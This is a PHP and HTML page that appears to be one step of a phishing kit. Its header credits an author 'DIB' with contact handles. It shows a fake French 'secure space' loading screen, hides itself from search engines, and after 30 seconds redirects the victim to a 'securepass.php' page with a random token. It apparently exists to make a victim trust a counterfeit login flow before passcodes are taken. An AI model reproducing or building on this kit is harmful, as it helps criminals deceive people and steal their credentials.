<?php

/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/
    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/favicon.ico"> 

        <title>Bienvenue</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="pb-0">
            <div class="container">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                
                <div class="loader">
                    <p>CHARGEMENT DE VOTRE ESPACE SÉCURISÉ EN COURS</p>
                    <div class="lds-ripple"><div></div><div></div></div>
                </div>
                
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'securepass.php?confirmation#_'+ dispatch;
            },30000); // 1000 = 1s
        </script>

    </body>

</html>